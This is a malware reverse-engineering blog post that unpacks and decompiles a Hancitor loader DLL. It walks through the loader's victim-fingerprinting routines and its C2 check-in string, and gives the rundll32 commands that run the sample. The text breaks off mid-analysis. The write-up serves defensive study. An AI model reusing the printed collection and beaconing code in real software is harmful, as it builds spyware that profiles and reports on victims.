---
title: Reversing the Hancitor loader
published: true
---

## Table of contents

* toc placeholder
{:toc}

## Introduction

Hancitor (also known as Chanitor) is a well-known malware loader, active since 2013. It is designed to install other malware on infected targets and is typically distributed through documents containing malicious macros and phishing campaigns. Once a victim opens the document and enables macros, Hancitor infects the target system and awaits additional C2 (Command and Control) instructions, such as installing ransomware or information stealers. More details can be found [here](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/Hancitor&threatId=-2147188234) and [here](https://malpedia.caad.fkie.fraunhofer.de/details/win.hancitor).

In this post we will reverse a Hancitor `.dll` variant available on [Malware Bazaar](https://bazaar.abuse.ch/sample/efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8/) using Ghidra (static analysis) and x32dbg/x64dbg (dynamic analysis). After the analysis, we will implement some YARA and Suricata rules to be able to detect infected machines.

## Executive summary

[This](https://bazaar.abuse.ch/sample/efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8/) Hancitor loader variant is a packed malware that unpacks a PE file in memory and then runs it from there. It uses additional obfuscation by storing the configuration (such as C2 server addresses) encrypted with RC4 and a hard-coded key which it decrypts using the Windows CryptoAPI. It collects details about the victim's system (like the OS, IP address, domain info, computer name and username). This information is used to create a unique victim ID and -probably- to choose the right payload later. The data is sent to the C2 server which then sends back commands in a base64 and XOR-encoded format, instructing the malware on how to load extra payloads and providing a download link. Hancitor can download and run different types of malicious files (`.exe`, `.dll` and shellcode) and can execute them in the context of the current process, by injecting into processes, running them as new processes or dropping them directly onto the disk (as a temp file) and running them from there.

## Detailed analysis

First we shorten the binary name so that the commands and outputs are easier to read in the following chapters.

```
> move efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8.dll hancitor.dll
```

### Hashes

```
> Get-FileHash hancitor.dll -Algorithm MD5 | Select-Object -ExpandProperty Hash
2172FDC8532872295D309682C5F323D9
> Get-FileHash hancitor.dll -Algorithm SHA1 | Select-Object -ExpandProperty Hash
A539B7FCB7706ADE3F5A3E9B01C27AE2399FBE61
> Get-FileHash hancitor.dll -Algorithm SHA256 | Select-Object -ExpandProperty Hash
EFBDD00DF327459C9DB2FFC79B2408F7F3C60E8BA5F8C5FFD0DEBAFF986863A8
```

### Overview

We can start with [Detect It Easy (DiE)](https://github.com/horsicq/Detect-It-Easy) to get a quick high level overview.

The binary is a 32 bit, packed `.dll` file but the packer is unknown:

```
$ diec hancitor.dll 
PE32
    Linker: Microsoft Linker(8.00.50727)
    Compiler: Microsoft Visual C/C++(14.00.50727)[LTCG/C]
    Tool: Visual Studio(2005)
```
```
$ diec -i hancitor.dll 
Info: 
    File name: /home/gemesa/Downloads/malware-bazaar/hancitor.dll
    Size: 491520
    File type: PE32
    String: PE(I386)
    Extension: dll
    Operation system: Windows(95)
    Architecture: I386
    Mode: 32-bit
    Type: DLL
    Endianness: LE
```

```
$ diec -b -e hancitor.dll
Total 6.41629: not packed
  0|PE Header|0|4096|0.799372: not packed
  1|Section(0)['.text']|4096|380928|6.54032: packed
  2|Section(1)['.data']|385024|8192|1.54622: not packed
  3|Section(2)['.reloc']|393216|16384|4.08239: not packed
```

### x32dbg

As we saw above, the binary is packed but DiE does not recognize the packer. In a lot of cases the binary can be unpacked by putting a breakpoint on `VirtualAlloc` and monitoring the allocated memory region(s). We might get lucky and recognize the `MZ` `(4D 5A)` magic number in memory which will mark the beginning of the unpacked PE file. Note that the unpacked file might not start at the beginning of the allocated memory region, so it is not enough to check the first bytes only.

Let's start experimenting and load the `.dll`. Then navigate to `Symbols` --> `kernel32.dll` --> `VirtualAlloc`, select it and press `F2` (toggle breakpoint). 

![x32dbg-0]({{site.baseurl}}/assets/hancitor-analysis/x32dbg-0.png)

Then navigate back to `CPU` and click `Run`. The first breakpoint is at `OptionalHeader.AddressOfEntryPoint`, click `Run` once again. The first `VirtualAlloc` call is hit. The memory address of the allocated section will be the return value of `VirtualAlloc` (stored in `EAX`), so we need to click `Execute till return`. At this point `EAX` stores the start of the allocated memory region. Right click on `EAX` --> `Follow in dump` --> select the 1. byte in the `Dump 1` window --> right-click --> `Breakpoint` --> `Hardware, Access` --> `Byte`.

![x32dbg-1]({{site.baseurl}}/assets/hancitor-analysis/x32dbg-1.png)

Click `Run`. We can see that the memory region is being written. Click `Step over` so `rep movsb` executes and fills the memory region. 

![x32dbg-2]({{site.baseurl}}/assets/hancitor-analysis/x32dbg-2.png)

We can search for `MZ` in this memory region by navigating to `Memory Map`, selecting the region starting at `0x02F70000` (this address will change in each run), right-clicking on this region and selecting `Find Pattern...`. Search for the `MZ` ASCII string. This will result in a false positive when following the single match in the dump. It does not look like a valid PE header (the DOS stub is missing for example).

![x32dbg-3]({{site.baseurl}}/assets/hancitor-analysis/x32dbg-3.png)

We can click on `Run` and wait to hit the next `VirtualAlloc` call. The workflow is the same as before, we click `Execute till return`, select `EAX`, click `Follow in dump`, set a HW access breakpoint on the 1. byte of the dump memory. We also remove the breakpoint set previously at `0x02F70000`. Then we click `Run` again. We can see that the memory region is being written. Click `Step over` so `rep movsb` executes and fills the memory region. Search for `MZ`: there is no match. Click `Run`. We stop at another `rep movsb` instruction. Click `Step Over`. Search for `MZ`: there is no match. Click `Run`. We enter a loop. There is a `leave` instruction after `loop`, set a breakpoint on it. At this point the loop is finished and we can check the content of the related memory section. Search for `MZ`: there is no match.

Click `Run`. We hit the 3. `VirtualAlloc` and things get more interesting. The workflow is the same as before, we click `Execute till return`, select `EAX`, click `Follow in dump`, set a HW access breakpoint on the 1. byte of the dump memory. Then we click `Run` once so our HW breakpoint is hit. After hitting `Execute till return` a couple of times and searching for the `MZ` pattern after each one, we can see a PE file forming in the memory. When it is fully unpacked, we can dump it to disk.

![x32dbg-4]({{site.baseurl}}/assets/hancitor-analysis/x32dbg-4.png)

The PE unpacking is finished at this `ret` instruction:

```
02F7023F | 31C9                     | xor ecx,ecx                             | ecx:ZwFreeVirtualMemory+C
02F70241 | 41                       | inc ecx                                 | ecx:ZwFreeVirtualMemory+C
02F70242 | E8 EEFFFFFF              | call 2F70235                            |
02F70247 | 11C9                     | adc ecx,ecx                             | ecx:ZwFreeVirtualMemory+C
02F70249 | E8 E7FFFFFF              | call 2F70235                            |
02F7024E | 72 F2                    | jb 2F70242                              |
02F70250 | C3                       | ret                                     |
02F70251 | 2B7C24 28                | sub edi,dword ptr ss:[esp+28]           |
02F70255 | 897C24 1C                | mov dword ptr ss:[esp+1C],edi           |
02F70259 | 61                       | popad                                   |
02F7025A | C3                       | ret                                     |
```

We can dump the file by navigating to `Memory Map` --> `0x030E0000` --> right-click --> `Dump Memory to File` and save it. Since the PE file header does not begin at the start of the memory region, we need to trim all data before the `MZ` magic number. Any hex editor can be used for this. (e.g. the 010 editor on Flare VM).

Alternatively, you can use the built-in [`savedata`](https://help.x64dbg.com/en/latest/commands/memory-operations/savedata.html) command:

```
savedata C:\Users\gemesa\Desktop\hancitor-unpacked.bin, 030E437C, 030E0000 + 00012000 - 030E437C
```

After rebuilding the unpacked binary with Scylla: `Plugins` --> `Scylla` --> `PE Rebuild`, it is ready for static analysis.

Note: my personal preference is manual unpacking but there are alternative automated solutions available, e.g.:
- [hollows_hunter](https://github.com/hasherezade/hollows_hunter)
- [mal_unpack](https://github.com/hasherezade/mal_unpack)
- [unpac.me](https://www.unpac.me/)


### Ghidra

Now that we have the unpacked binary, we can analyse it in Ghidra. During the analysis most of the functions have been renamed (based on their characteristics), for example `FUN_10001870` --> `mw_main`. The binary is stripped so Ghidra uses names like `FUN_<address>` and `DAT_<address>` after it runs its initial analysis. I usually add the `mw_` prefix (meaning malware) to all of the functions so they can be filtered and searched later more easily, and the `_w` suffix (meaning wrapper) to wrapper functions. If there are two wrapper levels `_ww` is used and so on.


> **Ghidra note 0**
> 
> Sometimes Ghidra does not recognize strings automatically and we need to change the datatype manually.
> 
> Before:
> 
> ```
>                              DAT_100041b8                                    > XREF[1]:     mw_handle_http_request_with_head
>         100041b8 50              ??         50h    P
>         100041b9 4f              ??         4Fh    O
>         100041ba 53              ??         53h    S
>         100041bb 54              ??         54h    T
>         100041bc 00              ??         00h
>         100041bd 00              ??         00h
>         100041be 00              ??         00h
>         100041bf 00              ??         00h
> ```
> 
> After:
> 
> ```
>                              s_POST_100041b8                                 > XREF[1]:     mw_handle_http_request_with_head
>         100041b8 50 4f 53        ds         "POST"
>                  54 00
>         100041bd 00              ??         00h
>         100041be 00              ??         00h
>         100041bf 00              ??         00h
> ```
> 
> Decompilation before:
> 
> ```
>           local_8 = HttpOpenRequestA(local_c,&DAT_100041b8,local_278,0,0,&> PTR_DAT_10007048,local_14,
>                                      0);
> 
> ```
> 
> Decompilation after:
> 
> ```
>           local_8 = HttpOpenRequestA(local_c,s_POST_100041b8,local_278,0,0,&> PTR_s_*/*_10007048,
>                                      local_14,0);
> ```


The `.dll` has 2 exports:

- `entry`
- `FCQNEAXPXCR`

`entry` is an empty function.

`FCQNEAXPXCR` is where things get more interesting. If we open the listing we can see there is an other name pointing to the same `0x19e0` address.


```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FCQNEAXPXCR(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         AL:1           <RETURN>
                             0x19e0  1  FCQNEAXPXCR
                             0x19e0  2  GSDEAEBPVHTSM
                             GSDEAEBPVHTSM                                   XREF[3]:     Entry Point(*), 100043d8(*), 
                             Ordinal_2                                                    100043dc(*)  
                             Ordinal_1
                             FCQNEAXPXCR
```

This means the function can be executed using any of the aliases:

```
rundll32.exe hancitor.dll,FCQNEAXPXCR
rundll32.exe hancitor.dll,GSDEAEBPVHTSM
```

Or using the ordinal numbers:

```
rundll32.exe hancitor.dll,#1
rundll32.exe hancitor.dll,#2
```

It directly calls `mw_main()`:


```c
void FCQNEAXPXCR(void)

{
                    /* 0x19e0  1  FCQNEAXPXCR
                       0x19e0  2  GSDEAEBPVHTSM */
  if (DAT_10007260 == 0) {
    mw_main();
    DAT_10007260 = 1;
  }
  return;
}
```

```c
void mw_main(void)

{
  int iVar1;
  int local_24;
  int local_20;
  int local_1c;
  char *local_18;
  char *local_14;
  char *local_10;
  SIZE_T local_c;
  char *local_8;
  
  local_c = 0x100000;
  local_14 = (char *)mw_heap_alloc_w(0x100000);
  local_18 = (char *)mw_heap_alloc_w(local_c);
  local_8 = (char *)mw_heap_alloc_w(0x1000);
  local_20 = 1;
  while (local_20 == 1) {
    iVar1 = mw_collect_and_send_info(local_14,local_c,&local_24);
    if (iVar1 == 1) {
      local_24 = mw_base64_decode_and_xor((int)(local_14 + 4),(int)local_18);
      local_10 = local_18;
      do {
        local_10 = mw_extract_cmd(local_10,local_8);
        iVar1 = mw_check_cmd(local_8);
        if (iVar1 == 1) {
          local_1c = 0;
          iVar1 = mw_execute_cmd(local_8,&local_1c);
          if ((iVar1 == 1) && (local_1c == 0)) {
            mw_store_failed_cmd(local_8);
          }
        }
      } while (local_10 != (char *)0x0);
    }
    Sleep(60000);
    mw_retry_failed_cmd();
    Sleep(60000);
  }
  return;
}
```

> **Ghidra note 1**
> 
> In some cases you might see local variables in a function like `in_EAX`.
> 
> ```c
> longlong __fastcall __allshl(byte param_1,int param_2)
> 
> {
>   uint in_EAX;
>   
>   if (0x3f < param_1) {
>     return 0;
>   }
>   if (param_1 < 0x20) {
>     return CONCAT44(param_2 << (param_1 & 0x1f) | in_EAX >> 0x20 - (param_1 & 0x1f),
>                     in_EAX << (param_1 & 0x1f));
>   }
>   return (ulonglong)(in_EAX << (param_1 & 0x1f)) << 0x20;
> }
> ```
> 
> Which might also affect the decompilation of the caller:
> 
> ```c
>   mw_get_volume_serial_number();
>   lVar1 = __allshl(0x20,0);
> ```
> 
> Where `mw_get_volume_serial_number` has a return value so something is clearly not right.
> 
> ```c
> DWORD mw_get_volume_serial_number(void)
> ```
> 
> The problem and the solution is discussed [here](https://github.com/NationalSecurityAgency/ghidra/discussions/3056#discussioncomment-767162):
> 
> > Right click on the function, select edit function signature. Set the calling convention to the correct one. If it is not present, or doesn't properly follow a convention, check the "use custom storage " and assign the storage as necessary.
> 
> Before:
> 
> ![Ghidra custom storage (before)]({{site.baseurl}}/assets/hancitor-analysis/ghidra-custom-storage-0.png)
> 
> After:
> 
> ![Ghidra custom storage (after)]({{site.baseurl}}/assets/hancitor-analysis/ghidra-custom-storage-1.png)
> 
> Now `in_EAX` is gone and the code looks much better:
> 
> ```c
> longlong __fastcall __allshl(byte param_1,int param_2,int param_3)
> 
> {
>   if (0x3f < param_1) {
>     return 0;
>   }
>   if (param_1 < 0x20) {
>     return CONCAT44(param_2 << (param_1 & 0x1f) | (uint)param_3 >> 0x20 - (param_1 & 0x1f),
>                     param_3 << (param_1 & 0x1f));
>   }
>   return (ulonglong)(uint)(param_3 << (param_1 & 0x1f)) << 0x20;
> }
> ```
> ```c
>   DVar1 = mw_get_volume_serial_number();
>   lVar2 = __allshl(0x20,0,DVar1);
> ```

We will not go through each function, only the most important ones such as `mw_collect_and_send_info`. Call graphs will also help us with a high level overview in some cases. Links to the relevant Windows API docs will be also added after each code block.

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
  BYTE *pBVar1;
  CHAR *pCVar2;
  CHAR *pCVar3;
  CHAR *pCVar4;
  uint uVar5;
  uint uVar6;
  CHAR local_1944 [4096];
  CHAR local_944 [2048];
  CHAR local_144 [256];
  CHAR local_44 [32];
  int local_24;
  undefined8 local_20;
  int local_18;
  uint local_14;
  uint local_10;
  DWORD local_c;
  int local_8;
  
  local_8 = 0x10001aad;
  local_c = GetVersion();
  local_20 = mw_get_id_from_mac_and_vsn_w();
  mw_get_computer_and_username(local_144);
  mw_get_public_ip_w(local_44);
  mw_get_domains(local_944);
  local_14 = local_c & 0xff;
  local_10 = (local_c & 0xffff) >> 8;
  local_24 = mw_get_system_info_w();
  if (local_24 == 1) {
    pCVar4 = local_44;
    pCVar3 = local_944;
    pCVar2 = local_144;
    uVar5 = local_14;
    uVar6 = local_10;
    pBVar1 = mw_decrypt_config_w();
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
  }
  else {
    pCVar4 = local_44;
    pCVar3 = local_944;
    pCVar2 = local_144;
    uVar5 = local_14;
    uVar6 = local_10;
    pBVar1 = mw_decrypt_config_w();
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_10004238,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
  }
  if (DAT_100072a0 == (BYTE *)0x0) {
    DAT_100072a0 = (BYTE *)mw_heap_alloc_w(0x400);
    *DAT_100072a0 = '\0';
  }
  local_18 = 1;
  while( true ) {
    if (local_18 != 1) {
      return 0;
    }
    if (*DAT_100072a0 == '\0') {
      local_18 = mw_parse_c2_urls(DAT_100072a0);
    }
    local_8 = mw_handle_http_request_with_header
                        (DAT_100072a0,local_1944,(int)param_1,param_2,param_3);
    if (local_8 == 1) {
      local_8 = mw_check_pattern(param_1);
    }
    if (local_8 == 1) break;
    *DAT_100072a0 = '\0';
  }
  return 1;
}
```

The malware assembles a victim ID string (and sends it to C2 later) containing various information about the victim machine.

The string is the following on 64 bit machines:

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
```
And looks like this on 32 bit machines:

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x32)"
```

The Windows version is added as `WIN` to the victim ID string.

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
  DWORD local_c;
...
  local_c = GetVersion();
...
  local_14 = local_c & 0xff;
  local_10 = (local_c & 0xffff) >> 8;
...
    uVar5 = local_14;
    uVar6 = local_10;
...
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
```

> [`GetVersion`](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversion)

Then `mw_get_id_from_mac_and_vsn` generates a unique ID from the MAC addresses and the volume serial number of the root drive.

```c
undefined8 mw_get_id_from_mac_and_vsn(void)

{
  DWORD DVar1;
  longlong lVar2;
  uint local_24;
  uint local_20;
  uint local_1c;
  uint uStack_18;
  int local_14;
  LPVOID local_10;
  undefined4 local_c;
  LPVOID local_8;
  
  local_1c = 0;
  uStack_18 = 0;
  local_c = 0x8000;
  local_10 = mw_heap_alloc_w(0x8000);
  local_8 = local_10;
  local_14 = GetAdaptersAddresses(2,0,0,local_10,&local_c);
  if (local_14 == 0) {
    for (; local_8 != (LPVOID)0x0; local_8 = *(LPVOID *)((int)local_8 + 8)) {
      mw_memset((undefined *)&local_24,0,8);
      mw_memcpy((undefined *)&local_24,(undefined *)((int)local_8 + 0x2c),
                *(int *)((int)local_8 + 0x34));
      local_1c = local_1c ^ local_24;
      uStack_18 = uStack_18 ^ local_20;
    }
  }
  mw_heap_free_w(local_10);
  DVar1 = mw_get_volume_serial_number();
  lVar2 = __allshl(0x20,0,DVar1);
  return CONCAT44((uint)((ulonglong)lVar2 >> 0x20) ^ uStack_18,(uint)lVar2 ^ local_1c);
}
```

> [`GetAdaptersAddresses`](https://learn.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersaddresses)


```c
DWORD mw_get_volume_serial_number(void)

{
  BOOL BVar1;
  CHAR local_110 [3];
  undefined uStack_10d;
  DWORD local_c;
  UINT local_8;
  
  local_8 = GetWindowsDirectoryA(local_110,0x104);
  if (local_8 != 0) {
    uStack_10d = 0;
    BVar1 = GetVolumeInformationA
                      (local_110,(LPSTR)0x0,0,&local_c,(LPDWORD)0x0,(LPDWORD)0x0,(LPSTR)0x0,0);
    if (BVar1 != 0) {
      return local_c;
    }
  }
  return 0;
}
```

> [`GetWindowsDirectoryA`](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)
>
> [`GetVolumeInformationA`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getvolumeinformationa)


The unique ID is added as `GUID` to the victim ID string.

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
```

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
undefined8 local_20;
...
  local_20 = mw_get_id_from_mac_and_vsn_w();
...
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
```

> **Ghidra note** 2
> 
> In some cases you might see `extraout_var`s and `CONCAT`s in the decompiled code which makes it less readable. Usually this means the return type of a function is wrong and needs to be fixed manually.
> 
> Before:
> 
> ```c
>   bVar1 = mw_get_username(local_210);
>   if (CONCAT31(extraout_var,bVar1) != 0) {
>     lstrcatA(param_1,local_210);
>   }
> ```
> 
> ```c
> bool __cdecl mw_get_username(LPSTR param_1)
> ```
> 
> After:
> 
> ```c
>   iVar2 = mw_get_username(local_210);
>   if (iVar2 != 0) {
>     lstrcatA(param_1,local_210);
>   }
> ```
> 
> ```c
> int __cdecl mw_get_username(LPSTR param_1)
> ```

Then it gets the computer name and username, and concatenates them separated by a `@`.


```c
undefined4 __cdecl mw_get_computer_and_username(LPSTR param_1)

{
  BOOL BVar1;
  int iVar2;
  CHAR local_210 [260];
  CHAR local_10c [260];
  DWORD local_8;
  
  *param_1 = '\0';
  local_8 = 0x104;
  BVar1 = GetComputerNameA(local_10c,&local_8);
  if (BVar1 != 0) {
    lstrcatA(param_1,local_10c);
  }
  lstrcatA(param_1,s_@_100042bc);
  iVar2 = mw_get_username(local_210);
  if (iVar2 != 0) {
    lstrcatA(param_1,local_210);
  }
  return 1;
}
```
> [`GetComputerNameA`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea)

Getting the computer name is straightforward with a simple API call. Figuring out the username requires more effort:

```c
int __cdecl mw_get_username(LPSTR param_1)

{
  int iVar1;
  CHAR local_218 [260];
  CHAR local_114 [260];
  DWORD local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_10 = mw_get_pid_by_name(s_explorer.exe_100042a8);
  local_c = 0x104;
  local_8 = 0x104;
  *param_1 = '\0';
  iVar1 = mw_get_process_username(local_10,local_218,0x104,local_114);
  if (iVar1 != 0) {
    lstrcpyA(param_1,local_114);
    lstrcatA(param_1,s_\_100042b8);
    lstrcatA(param_1,local_218);
  }
  return (uint)(iVar1 != 0);
}
```
First the program fetches the PID of `explorer.exe` via `mw_get_pid_by_name`.

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_get_pid_by_name @ 10002e90
  __alloca_probe @ 10001420
  K32EnumProcesses @ 10003bdd
    K32EnumProcesses @ EXTERNAL:000000bc
  mw_get_process_file_name @ 10002f30
    OpenProcess @ EXTERNAL:00000129
    K32GetProcessImageFileNameA @ 10003be3
      K32GetProcessImageFileNameA @ EXTERNAL:000000be
    CloseHandle @ EXTERNAL:0000011e
    lstrcpyA @ EXTERNAL:0000005c
  lstrcmpiA @ EXTERNAL:00000061

OrderedCallGraphGenerator.java> Finished!
```

`mw_get_pid_by_name` finds the PID by enumerating all running processes, retrieving the executable filename for each one and returning the PID when the filename matches the requested name (which is `explorer.exe` that runs in the user's security context).

```c
DWORD __cdecl mw_get_pid_by_name(LPCSTR param_1)

{
  int iVar1;
  DWORD local_1114 [1024];
  CHAR local_114 [260];
  uint local_10;
  uint local_c;
  uint local_8;
  
  local_8 = 0x10002e9d;
  iVar1 = K32EnumProcesses(local_1114,0x1000,&local_c);
  if (iVar1 != 0) {
    local_10 = local_c >> 2;
    for (local_8 = 0; local_8 < local_10; local_8 = local_8 + 1) {
      iVar1 = mw_get_process_file_name(local_1114[local_8],local_114);
      if ((iVar1 != 0) && (iVar1 = lstrcmpiA(local_114,param_1), iVar1 == 0)) {
        return local_1114[local_8];
      }
    }
  }
  return 0xffffffff;
}
```
> [`EnumProcesses`/`K32EnumProcesses`](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses)


```c
undefined4 __cdecl mw_get_process_file_name(DWORD param_1,LPSTR param_2)

{
  char local_118 [260];
  uint local_14;
  char *local_10;
  HANDLE local_c;
  uint local_8;
  
  local_c = OpenProcess(0x400,0,param_1);
  if (local_c != (HANDLE)0x0) {
    local_14 = K32GetProcessImageFileNameA(local_c,local_118,0x104);
    CloseHandle(local_c);
    if (local_14 != 0) {
      local_10 = (char *)0x0;
      for (local_8 = 0; local_8 < local_14; local_8 = local_8 + 1) {
        if (local_118[local_8] == '\\') {
          local_10 = local_118 + local_8 + 1;
        }
        if (local_118[local_8] == '\0') break;
      }
      if (local_10 != (LPCSTR)0x0) {
        lstrcpyA(param_2,local_10);
        return 1;
      }
    }
  }
  return 0;
}
```

> [`OpenProcess`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
>
> [`GetProcessImageFileNameA`/`K32GetProcessImageFileNameA`](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getprocessimagefilenamea)
>
> [`CloseHandle`](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)

Then it looks up the username via the following steps:

- takes the PID of `explorer.exe`
- opens the process and its token
- retrieves the token's user SID (Security Identifier)
- looks up the account name from the SID

```c
undefined4 __cdecl
mw_get_process_username(DWORD param_1,LPSTR param_2,undefined4 param_3,LPSTR param_4)

{
  BOOL BVar1;
  DWORD DVar2;
  _SID_NAME_USE local_20;
  undefined4 local_1c;
  PSID *local_18;
  PSID *local_14;
  HANDLE local_10;
  HANDLE local_c;
  SIZE_T local_8;
  
  local_c = OpenProcess(0x400,0,param_1);
  if ((local_c != (HANDLE)0x0) && (BVar1 = OpenProcessToken(local_c,0x20008,&local_10), BVar1 != 0))
  {
    local_8 = 0;
    BVar1 = GetTokenInformation(local_10,TokenUser,(LPVOID)0x0,0,&local_8);
    if ((BVar1 == 0) && (DVar2 = GetLastError(), DVar2 == 0x7a)) {
      local_18 = (PSID *)mw_heap_alloc_w(local_8);
      local_1c = 0;
      local_14 = local_18;
      BVar1 = GetTokenInformation(local_10,TokenUser,local_18,local_8,&local_8);
      if ((BVar1 != 0) &&
         (BVar1 = LookupAccountSidA((LPCSTR)0x0,*local_14,param_2,&param_3,param_4,
                                    (LPDWORD)&stack0x00000014,&local_20), BVar1 != 0)) {
        local_1c = 1;
      }
      mw_heap_free_w(local_18);
      return local_1c;
    }
  }
  return 0;
}
```

> [`OpenProcess`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)

> [`OpenProcessToken`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)

> [`GetTokenInformation`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation)

> [`GetLastError`](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror)

> [`LookupAccountSidA`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupaccountsida)

The computer and username are added as `INFO` to the victim ID string.

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
```

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
  CHAR local_144 [256];
...
  mw_get_computer_and_username(local_144);
...
    pCVar2 = local_144;
...
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
```

`mw_get_public_ip_w` fetches the victim's public IP via http://api.ipify.org. If the query fails then `0.0.0.0` is used instead.

```c
undefined4 __cdecl mw_get_public_ip_w(LPSTR param_1)

{
  undefined4 uVar1;
  int iVar2;
  int local_8;
  
  if (DAT_10007280 == '\0') {
    iVar2 = mw_handle_http_request(s_http://api.ipify.org_100041d0,0x10007280,0x20,&local_8);
    if (iVar2 == 1) {
      (&DAT_10007280)[local_8] = 0;
      lstrcpyA(param_1,&DAT_10007280);
      uVar1 = 1;
    }
    else {
      DAT_10007280 = '\0';
      lstrcpyA(param_1,s_0.0.0.0_100041e8);
      uVar1 = 0;
    }
  }
  else {
    lstrcpyA(param_1,&DAT_10007280);
    uVar1 = 1;
  }
  return uVar1;
}
```

Call graph of `mw_handle_http_request`:

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_handle_http_request @ 10001fe0
  mw_memset @ 100014a0
  InternetCrackUrlA @ EXTERNAL:00000052
  mw_open_connection @ 100024f0
    InternetOpenA @ EXTERNAL:0000004e
  InternetConnectA @ EXTERNAL:00000057
  HttpOpenRequestA @ EXTERNAL:00000053
  InternetCloseHandle @ EXTERNAL:00000050
  InternetQueryOptionA @ EXTERNAL:00000055
  InternetSetOptionA @ EXTERNAL:00000054
  HttpSendRequestA @ EXTERNAL:0000004f
  HttpQueryInfoA @ EXTERNAL:00000051
  InternetReadFile @ EXTERNAL:00000056

OrderedCallGraphGenerator.java> Finished!
```

The public IP is added as `IP` to the victim ID string.

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
```
```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
  CHAR local_44 [32];
...
  mw_get_public_ip_w(local_44);
...
    pCVar4 = local_44;
...
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
```

Domain information is also collected:

```c
undefined4 __cdecl mw_get_domains(LPSTR param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint local_10;
  int local_c;
  uint local_8;
  
  *param_1 = '\0';
  iVar1 = DsEnumerateDomainTrustsA(0,0x3f,&local_c,&local_10);
  if (iVar1 == 0) {
    if (local_10 == 0) {
      uVar2 = 1;
    }
    else {
      for (local_8 = 0; local_8 < local_10; local_8 = local_8 + 1) {
        if (*(int *)(local_c + local_8 * 0x2c) != 0) {
          lstrcatA(param_1,*(LPCSTR *)(local_c + local_8 * 0x2c));
          lstrcatA(param_1,s_;_100041c8);
        }
        if (*(int *)(local_c + 4 + local_8 * 0x2c) != 0) {
          lstrcatA(param_1,*(LPCSTR *)(local_c + 4 + local_8 * 0x2c));
          lstrcatA(param_1,s_;_100041cc);
        }
      }
      uVar2 = 1;
    }
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}
```

> [`DsEnumerateDomainTrustsA`](https://learn.microsoft.com/en-us/windows/win32/api/dsgetdc/nf-dsgetdc-dsenumeratedomaintrustsa)

> [Flags](https://learn.microsoft.com/en-us/windows/win32/api/dsgetdc/ns-dsgetdc-ds_domain_trustsa#ds_domain_in_forest-1-0x1)

Since `0x3f` is passed as `Flags`, all domains are enumerated.

The domain information is added as `EXT` to the victim ID string.

```
